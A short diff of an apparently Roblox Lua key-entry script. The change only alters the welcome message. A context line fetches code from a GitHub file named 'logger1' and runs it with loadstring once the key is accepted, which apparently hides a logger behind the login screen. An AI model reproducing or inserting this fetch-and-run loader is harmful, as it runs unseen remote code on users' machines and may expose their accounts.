@@ -53,7 +53,7 @@ Enter.MouseButton1Down:connect(function()
 		wait(2)
 		Enter.Text = "Correct key!"
 		wait(1)
-		Enter.Text = "Welcome to fertio"
+		Enter.Text = "Welcome to creepy"
 		wait(1)
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/creepyV4/log-1/main/logger1"))()
 		Login.Visible = false
